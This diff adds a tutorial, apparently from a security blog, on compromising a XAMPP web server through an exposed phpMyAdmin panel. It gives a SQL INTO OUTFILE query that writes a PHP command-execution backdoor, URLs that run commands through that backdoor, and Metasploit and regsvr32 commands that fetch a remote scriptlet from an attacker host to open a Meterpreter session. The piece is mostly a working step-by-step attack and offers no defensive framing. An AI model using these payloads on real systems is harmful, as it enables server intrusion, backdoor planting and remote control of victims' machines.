@@ -1,0 +1,51 @@
+
+Shell Uploading in Web Server through PhpMyAdmin
+
+In this tutorial we will learn how to exploit a web server if we found phpmyadmin panel has been left open. Here I will try to exploit phpmyadmin which is running inside the localhost “xampp” by generating a SQL query to execute malicious code and then make an effort to access the shell of victim’s Pc.
+PhpMyAdmin is a free software tool written in PHP, intended to handle the administration of MySQL over the Web. phpMyAdmin supports a wide range of operations on MySQL and MariaDB. Frequently used operations (managing databases, tables, columns, relations, indexes, users, permissions, etc) can be performed via the user interface, while you still have the ability to directly execute any SQL statement.
+Features
+For information visit: https://www.phpmyadmin.net
+ Lets start!!!
+Open the localhost address:192.168.1.101:81 in the browser and select the option phpmyadmin from the given list of xampp as shown the following screenshot.
+
+When you come into PhpMyAdmin application, here you will find different areas. On the left side of the screen you can see the list of database names. As we are inside the administration console where we can perform multiple tasks which I have defined above therefore I am going to create a new database
+Now click on new to create a database.
+
+Give name to your database as I have given Ignite technologies and click on create.
+
+Now you can see the database ignite technologies has been added in the list of databases.
+
+Click on ignite technologies database to construct MYSQL query inside your database. Hence click on SQL tab where you can enter the SQL query code.
+
+Click on ignite technologies database to construct MYSQL query inside your database. Hence click on SQL tab where you can enter the SQL query code.
+
+Now this is interesting part because here I am going to execute a malicious code as SQL query which will create a command shell vulnerability inside the web server. 
+SELECT “<?php system($_GET[‘cmd’]); ?>” into outfile “C:\\xampp\\htdocs\\backdoor.php”
+In the following screenshot you can see I have given above malicious php code as SQL query and then click on GO tab to execute it.
+
+Now type following URL to find whether we are successful or not in order to create OS command shell vulnerability.
+http://192.168.1.101:81/backdoor.php
+Awesome!!!  You can see it has given warning which means we had successfully created OS command shell vulnerability.
+ 
+
+http://192.168.1.101:81/backdoor.php?cmd=dir
+When you execute above URL in the browser you will get the information of victim‘s PC directories.
+
+Next step will to achieve meterpreter session of victim’s Pc. Open other terminal in kali Linux and type following command.
+msfconsole
+msf > use exploit/windows/misc/regsvr32_applocker_bypass_server
+msf exploit(regsvr32_applocker_bypass_server) > set lhost 192.168.1.104
+msf exploit(regsvr32_applocker_bypass_server) > set lport 4444
+msf exploit(regsvr32_applocker_bypass_server) > exploit
+Copy the selected part for dll file and use this malicious code as the command inside the URL.
+regsvr32 /s /n /u / i:http://192.168.1.104:8080/sVW72p3IRZBScv.sct%20scrobj.dll
+
+Paste the above code the URL and execute it which will give meterpreter session on metasploit
+http://192.168.1.101:81/backdoor.php?cmd= regsvr32 /s /n /u / i:http://192.168.1.104:8080/sVW72p3IRZBScv.sct%20scrobj.dll
+
+From following screenshot you can see meterpreter session 1 opened.
+
+Sessions –i 1
+Meterpreter>sysinfo
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
